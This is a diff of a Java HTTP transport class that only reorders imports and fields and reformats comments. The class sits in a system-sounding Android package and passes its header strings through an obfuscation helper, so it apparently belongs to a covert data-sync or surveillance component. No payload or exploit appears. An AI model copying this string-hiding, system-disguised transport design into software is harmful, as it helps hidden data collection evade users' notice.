@@ -9,9 +9,9 @@
 
 package com.android.syssetup.action.sync;
 
-import java.io.DataInputStream;
-import java.io.IOException;
-import java.util.List;
+import com.android.mm.M;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.Check;
 
 import org.apache.http.HttpResponse;
 import org.apache.http.HttpStatus;
@@ -23,28 +23,72 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpParams;
 
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.Check;
-import com.android.mm.M;
+import java.io.DataInputStream;
+import java.io.IOException;
+import java.util.List;
 
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class HttpTransport.
  */
 public abstract class HttpTransport extends Transport {
 
-	/** The Constant PORT. */
+	/**
+	 * The Constant PORT.
+	 */
 	private static final int PORT = 80;
-	/** The debug. */
+	/**
+	 * The debug.
+	 */
 	private static final String TAG = "HttpTransport"; //$NON-NLS-1$
-	/** The host. */
+	/**
+	 * The accept wifi.
+	 */
+	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
+			boolean acceptWifi = false;
+	/**
+	 * The HEADE r_ contenttype.
+	 */
+	protected final String HEADER_CONTENTTYPE = M.e("content-type"); //$NON-NLS-1$
+
+	// private String transportId;
+	/**
+	 * The HEADE r_ setcookie.
+	 */
+	protected final String HEADER_SETCOOKIE = M.e("set-cookie"); //$NON-NLS-1$
+	/**
+	 * The HEADE r_ contentlen.
+	 */
+	protected final String HEADER_CONTENTLEN = M.e("content-length"); //$NON-NLS-1$
+	/**
+	 * The CONTEN t_ type.
+	 */
+	protected final String CONTENT_TYPE = M.e("application/octet-stream"); //$NON-NLS-1$
+	/**
+	 * The cookies.
+	 */
+	protected List<Cookie> cookies;
+	/**
+	 * The host.
+	 */
 	String host;
+	/**
+	 * The stop.
+	 */
+	boolean stop;
+
+	// private final String USER_AGENT =
+	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
+	/**
+	 * The follow_moved.
+	 */
+	boolean follow_moved = true;
 
 	/**
 	 * Instantiates a new http transport.
-	 * 
-	 * @param host
-	 *            the host
+	 *
+	 * @param host the host
 	 */
 	public HttpTransport(final String host) {
 		// TODO: aggiungere variabilita'....
@@ -55,34 +99,6 @@ public abstract class HttpTransport extends Transport {
 		cookies = null;
 		stop = false;
 	}
-
-	// private String transportId;
-	/** The cookies. */
-	protected List<Cookie> cookies;
-
-	/** The stop. */
-	boolean stop;
-
-	/** The follow_moved. */
-	boolean follow_moved = true;
-
-	/** The HEADE r_ contenttype. */
-	protected final String HEADER_CONTENTTYPE = M.e("content-type"); //$NON-NLS-1$
-
-	/** The HEADE r_ setcookie. */
-	protected final String HEADER_SETCOOKIE = M.e("set-cookie"); //$NON-NLS-1$
-
-	/** The HEADE r_ contentlen. */
-	protected final String HEADER_CONTENTLEN = M.e("content-length"); //$NON-NLS-1$
-
-	// private final String USER_AGENT =
-	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
-	/** The CONTEN t_ type. */
-	protected final String CONTENT_TYPE = M.e("application/octet-stream"); //$NON-NLS-1$
-
-	/** The accept wifi. */
-	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
-	boolean acceptWifi = false;
 
 	/*
 	 * (non-Javadoc)
@@ -97,12 +113,10 @@ public abstract class HttpTransport extends Transport {
 	/**
 	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
 	 * httpclient
-	 * 
-	 * @param data
-	 *            the data
+	 *
+	 * @param data the data
 	 * @return the byte[]
-	 * @throws TransportException
-	 *             the transport exception
+	 * @throws TransportException the transport exception
 	 */
 	@Override
 	public synchronized byte[] command(final byte[] data) throws TransportException {
